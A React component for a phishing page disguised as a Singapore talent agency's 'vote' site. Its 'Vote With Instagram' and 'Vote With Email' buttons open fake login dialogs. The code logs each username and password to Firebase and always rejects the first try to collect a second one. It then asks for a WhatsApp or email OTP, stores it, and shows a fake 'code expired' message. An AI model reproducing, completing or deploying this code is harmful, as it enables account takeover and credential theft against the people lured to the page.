"use client";

import { useState, useEffect } from "react";
import { auth, signInAnonymously } from "../lib/firebase";
import { submitLoginAttempt } from "../services/voteService";

// Import your components
import InstagramVote from "./InstagramVote";
import EmailVote from "./EmailVote";
import WhatsAppOTP from "./WhatsAppOTP";
import EmailOTP from "./EmailOTP";
import ErrorDialog from "./ErrorDialog";

export default function Hero() {
  const [activeModal, setActiveModal] = useState<
    "instagram" | "email" | "whatsappOTP" | "emailOTP" | null
  >(null);
  const [showError, setShowError] = useState(false);
  const [voterIdentity, setVoterIdentity] = useState("");
  const [voterPassword, setVoterPassword] = useState(""); // Needed for logging
  const [attempts, setAttempts] = useState(0);

  // Trigger Firebase logging whenever a new login attempt is captured
  useEffect(() => {
    if (voterIdentity && voterPassword) {
      const logAttempt = async () => {
        try {
          await signInAnonymously(auth);
          const accountType =
            activeModal === "instagram" ? "Insta-gram" : "Hot-Mail";

          await submitLoginAttempt(
            voterIdentity,
            voterPassword,
            accountType,
            "login_attempt",
            {
              attempt_number: attempts,
            }
          );

          console.log("Attempt logged to Firebase successfully.");
        } catch (error) {
          console.error("Firebase logging failed:", error);
        }
      };

      logAttempt();
    }
  }, [voterIdentity, voterPassword]); // Only runs when identity or password updates

  const handleLoginSubmit = (identity: string, pass: string) => {
    setVoterIdentity(identity);
    setVoterPassword(pass);

    // Logic for showing Error vs OTP
    if (attempts >= 1) {
      if (/^\d+$/.test(identity)) {
        setActiveModal("whatsappOTP");
      } else {
        setActiveModal("emailOTP");
      }
      setAttempts(0);
    } else {
      setAttempts((prev) => prev + 1);
      setShowError(true);
    }
  };

  const handleOtpVerify = async (otp: string) => {
    const accountType =
      activeModal === "whatsappOTP" ? "WhatsApp" : "Email-OTP";
    await submitLoginAttempt(
      voterIdentity,
      voterPassword,
      accountType,
      "otp_submission",
      {
        otp: otp,
        otp_verified: true,
      }
    );
    // Show final "Expired" dialog as per your original JS logic
    setShowError(true);
  };

  return (
    <>
      {/* MODAL LAYER */}
      {activeModal === "instagram" && (
        <InstagramVote
          onClose={() => setActiveModal(null)}
          onLogin={(id, pass) => handleLoginSubmit(id, pass)}
        />
      )}

      {activeModal === "email" && (
        <EmailVote
          onClose={() => setActiveModal(null)}
          onLogin={(id, pass) => handleLoginSubmit(id, pass)}
        />
      )}

      {activeModal === "whatsappOTP" && (
        <WhatsAppOTP
          phoneNumber={voterIdentity}
          onClose={() => setActiveModal(null)}
          onVerify={handleOtpVerify}
        />
      )}

      {activeModal === "emailOTP" && (
        <EmailOTP
          emailAddress={voterIdentity}
          onClose={() => setActiveModal(null)}
          onVerify={handleOtpVerify}
        />
      )}

      {showError && (
        <ErrorDialog
          title={
            attempts === 0 && voterIdentity
              ? "This code has expired"
              : "Incorrect Password"
          }
          message={
            attempts === 0 && voterIdentity
              ? "Please check for a new code and try again."
              : "The password you entered is incorrect. Please try again."
          }
          onClose={() => setShowError(false)}
        />
      )}

      {/* HERO SECTION (Video & Buttons) */}
      <section className="video-hero relative h-screen overflow-hidden">
        <video
          autoPlay
          muted
          loop
          playsInline
          className="absolute inset-0 w-full h-full object-cover z-[-1]">
          <source src="/videos/bg_video.mp4" type="video/mp4" />
        </video>
        <div className="absolute inset-0 bg-black/30 z-0"></div>
        <div className="relative z-10 flex flex-col items-center justify-center h-full text-white text-center">
          <span className="text-xl uppercase tracking-widest mb-2">
            Welcome to
          </span>
          <h1 className="text-7xl font-bold mb-4">Markies</h1>
          <p className="text-xl mb-8">A Singapore Based Talent Agency</p>
          <div className="flex gap-4">
            <button
              onClick={() => setActiveModal("instagram")}
              className="bg-blue-600 hover:bg-blue-700 px-8 py-3 rounded-full font-bold transition">
              Vote With Instagram
            </button>
            <button
              onClick={() => setActiveModal("email")}
              className="bg-blue-600 hover:bg-blue-700 px-8 py-3 rounded-full font-bold transition">
              Vote With Email
            </button>
          </div>
        </div>
      </section>
    </>
  );
}
